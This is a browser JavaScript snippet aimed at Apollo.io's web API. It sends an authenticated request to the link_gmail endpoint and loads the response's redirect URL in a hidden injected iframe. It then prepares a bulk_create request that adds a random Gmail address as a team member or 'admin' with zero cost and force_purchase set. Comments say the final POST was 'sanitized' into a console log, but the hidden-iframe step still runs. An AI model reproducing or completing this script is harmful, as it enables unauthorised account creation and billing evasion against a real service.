// generate & return an email; also perform the redirect iframe injection
async function fetchRedirect() {
  // generate email
  const num = Math.floor(Math.random() * 99999) + 1; // 1..99999
  const padded = num.toString().padStart(5, "0");    // always 5 digits
  const email = `test_user_${padded}@gmail.com`;

  try {
    // keep the original redirect fetch/iframe logic if you need it,
    // but DO NOT use this script to create real accounts on third-party services.
    const step1 = await fetch(
      "https://app.apollo.io/api/v1/email_accounts/link_gmail?mode=user_signin&redirect_to=https%3A%2F%2Fapp.apollo.io%2F%23%2Fonboarding-hub%2Fqueue&cacheKey=" + Date.now(),
      { cache: "no-store", credentials: "include" }
    );

    const data1 = await step1.json();
    const redirectTo = data1?.redirect_to;
    if (redirectTo) {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = redirectTo;
      document.body.appendChild(iframe);
    } else {
      console.warn("No redirect_to in response.");
    }

    // return the generated email to the caller (clean API)
    return email;
  } catch (err) {
    console.error("fetchRedirect error:", err);
    // still return the generated email even if redirect fails (optional)
    return email;
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function createUser() {
  // await the redirect/email generation
  const email = await fetchRedirect();
  await sleep(1500);

  // --- SANITIZED: we'll only build & log the request body here ---
  try {
    // In your original code you fetch user preferences and permission sets.
    // For safety, replace those calls with mocks or skip them when testing locally.
    // Below I'll show a mocked permissionSetId for local testing.

    const permissionSetId = "mock-permission-set-id"; // mock for testing

    const body = {
      emails: [email],
      cost_per_billing_cycle: 0,
      seats_to_add: 0,
      due_now: 0,
      force_purchase: true,
      campaign: "team_member_invite_bulk_modal",
      permission_set_id: permissionSetId,
      cacheKey: Date.now()
    };

    // Instead of posting to a live site, log the prepared body so you can inspect it:
    console.log("Prepared bulk_create body (SANITIZED):", JSON.stringify(body, null, 2));

    // If you want to test a full POST, use a local mock endpoint:
    // const mockEndpoint = "http://localhost:3000/api/v1/users/bulk_create";
    // const res = await fetch(mockEndpoint, {
    //   method: "POST",
    //   headers: { "Content-Type": "application/json" },
    //   body: JSON.stringify(body)
    // });
    // console.log("Mock response:", await res.json());

    alert(`The email --> ${email} got prepared as the admin (SANITIZED)`);
  } catch (err) {
    alert("❌ Error: " + err.message);
  }
}

createUser();
